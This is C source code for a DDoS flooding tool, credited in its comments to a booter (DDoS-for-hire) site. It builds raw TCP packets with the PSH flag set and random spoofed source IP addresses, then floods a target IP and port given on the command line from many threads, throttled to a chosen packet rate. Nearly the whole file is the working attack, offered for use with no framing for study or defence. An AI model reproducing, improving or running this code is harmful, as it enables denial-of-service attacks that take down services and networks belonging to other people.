// TCP-PSH spoofed attack.
// © Booter.pw 2019

// Imports.
#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<errno.h>
#include<netinet/tcp.h>
#include <arpa/inet.h>
#include<netinet/ip.h>
#include <pthread.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>
#include <time.h>

// Declaration of start global variables.
static unsigned int floodport;
#define BUFFER_SIZE 100
char sourceip[17];
volatile int limiter; // PPS Limitator.
volatile unsigned int pps; // PPS per Second, Global variable including for Threads.
volatile unsigned int sleeptime = 100; // Sleep in miliseconds for each packet if pps exeded.
volatile unsigned int lenght_pkt = 0;

// Structure of the pseudo-header object.
struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
    struct tcphdr tcp;
};

unsigned short checksum_tcp_packet(unsigned short *ptr,int nbytes) {
    // Variables for csum.
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}

void *flooding_thread(void *par1)
{
    // Make socket
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s == -1)
    {
        perror("[!] For use Script you need root stupid...");
        exit(1);
    }

    // Declares
    char *targettr = (char *)par1;
    char datagram[4096] , source_ip[32] , *data , *pseudogram;
    
    // Zero out the packet buffer.
    memset (datagram, 0, 4096);

    // IPv4 header.
    struct iphdr *iph = (struct iphdr *) datagram;

    // TCP header.
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    //Data part
    data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
    if (lenght_pkt == 0)  { // Bypass pps.
        data = "";
    }

    // Source Address and Such.
    char primera [ 20 ] ;
    int one_r = random_number_beetwhen(1, 250);
    int two_r = random_number_beetwhen(1, 250);
    int three_r = random_number_beetwhen(1, 250);
    int four_r = random_number_beetwhen(1, 250);

    snprintf(primera, sizeof(primera)-1, "%d.%d.%d.%d", one_r, two_r, three_r, four_r);
    snprintf(sourceip, sizeof(sourceip)-1, primera);
    strcpy(source_ip , sourceip);
    sin.sin_family = AF_INET;
    int rdzeroport;
    if (floodport == 1) { // Random destination port.
        rdzeroport = random_number_beetwhen(2, 65535);
        sin.sin_port = htons(rdzeroport);
        tcph->dest = htons (rdzeroport);
    } else {
        sin.sin_port = htons(floodport);
        tcph->dest = htons (floodport);
    }

    // All other IP packet header.
    sin.sin_addr.s_addr = inet_addr (targettr);
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
    iph->id = htons(1);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0; 
    iph->saddr = inet_addr ( source_ip );  
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = checksum_tcp_packet ((unsigned short *) datagram, iph->tot_len);
    int randSeq = random_number_beetwhen(10000, 99999);
    //int randAckSeq = random_number_beetwhen(10000, 99999);
    int randSP = random_number_beetwhen(2, 65535);
    //int randPD = random_number_beetwhen(2, 65535);
    //int randttl = random_number_beetwhen(1, 255);
    //int randihl = random_number_beetwhen(4, 7);
    int randWin = random_number_beetwhen(1000, 9999);
    tcph->source = randSP;
    tcph->seq = randSeq;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin=0;
    tcph->syn=0;
    tcph->rst=0;
    tcph->psh=1;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = randWin;
    tcph->check = 0;
    tcph->urg_ptr = 0;

    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );
    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
    pseudogram = malloc(psize);
    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
    tcph->check = checksum_tcp_packet( (unsigned short*) pseudogram , psize);
    free(pseudogram);
    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        exit(0);
    }
    int i;
    while (1)
    {
        //Send the packet
        if (sendto (s, datagram, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0)       /* a normal send() */
        {
            // ok
        } else {
            // Generate new IP.
            one_r = random_number_beetwhen(1, 250);
            two_r = random_number_beetwhen(1, 250);
            three_r = random_number_beetwhen(1, 250);
            four_r = random_number_beetwhen(1, 250);
            snprintf(primera, sizeof(primera)-1, "%d.%d.%d.%d", one_r, two_r, three_r, four_r);
            snprintf(sourceip, sizeof(sourceip)-1, primera);
            strcpy(source_ip , sourceip);
            iph->saddr = inet_addr ( source_ip ); 
            psh.source_address = inet_addr( source_ip );
            if (lenght_pkt == 0) { // Bypass pps.
                data = "";
            }
            if (floodport == 0) {
                rdzeroport = random_number_beetwhen(2, 65535);
                sin.sin_port = htons(rdzeroport);
                tcph->dest = htons (rdzeroport);
            } else {
                sin.sin_port = htons(floodport);
                tcph->dest = htons (floodport);
            }
            randSeq = random_number_beetwhen(10000, 99999);
            //randAckSeq = random_number_beetwhen(10000, 99999);
            randSP = random_number_beetwhen(2, 65535);
            //randPD = random_number_beetwhen(2, 65535);
            //randttl = random_number_beetwhen(1, 255);
            tcph->source = randSP;
            tcph->doff = 5;      // First and only TCP segment, reset option. 
            tcph->seq = htons(randSeq);
            tcph->ack  = 0;
            tcph->ack_seq = 0;
            tcph->psh  = 1; 
            tcph->fin  = 0;
            tcph->rst  = 0;
            tcph->res2 = 0;
            tcph->doff = 5;
            tcph->syn = 0; 
            tcph->urg  = 0;
            tcph->urg_ptr = 0;

            tcph->window = htons(512);
            tcph->check = 0;

            iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
            iph->protocol = IPPROTO_TCP;
            iph->check = 0;
            iph->daddr = sin.sin_addr.s_addr;
            iph->check = checksum_tcp_packet ((unsigned short *) datagram, iph->tot_len);
            psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );
            int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
            pseudogram = malloc(psize);
            memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
            memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
            tcph->check = checksum_tcp_packet( (unsigned short*) pseudogram , psize);
            free(pseudogram);
            int one = 1;
            const int *val = &one;
            if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
            {
                exit(0);
            }
            pps++;
            if(i >= limiter)
            {
                i = 0;
                usleep(sleeptime);
            }
            i++;
        }   
    }
}
int random_number_beetwhen(int min, int max) {
   static bool first = true;
   if (first) {  
      srand( time(NULL) );
      first = false;
   }
   return min + rand() % (max + 1 - min);
}
int main(int argc, char *argv[ ])
{
    if(argc < 6){
        fprintf(stderr, "[+] TCP-PSH © Booter.pw 2019 by @Alemalakra.\n");
        fprintf(stdout, "[+] Usage: %s <IP> <PORT> <THREADS> <TIME> <PPS>\n", argv[0]);
        exit(-1);
    }
    int multiplier = 20;
    pps = 0;
    limiter = 0;

    // Arguments of Method.

    floodport = atoi(argv[2]);
    void * target = argv[1];
    int maxim_pps = atoi(argv[5]);
    int num_threads = atoi(argv[3]);
    lenght_pkt = 0;
    pthread_t thread[num_threads];
    int alem = 0;
    int i;
    fprintf(stdout, "[+] Starting threads (This may take some seconds.)\n");
    for(alem = 0;alem<num_threads;alem++){
      pthread_create( &thread[alem], NULL, &flooding_thread, (void *)argv[1]); // Target
    }
    fprintf(stdout, "[-] Attack started.\n");
    for(i = 0;i<(atoi(argv[4])*multiplier);i++) {
        usleep((1000/multiplier)*1000);
        if((pps*multiplier) > maxim_pps)
        {
            if(1 > limiter)
            {
                sleeptime+=100;
            } else {
                limiter--;
            }
        } else {
            limiter++;
            if(sleeptime > 25)
            {
                sleeptime-=25;
            } else {
                sleeptime = 0;
            }
        }
        pps = 0;
    }    
     
    return 0;
}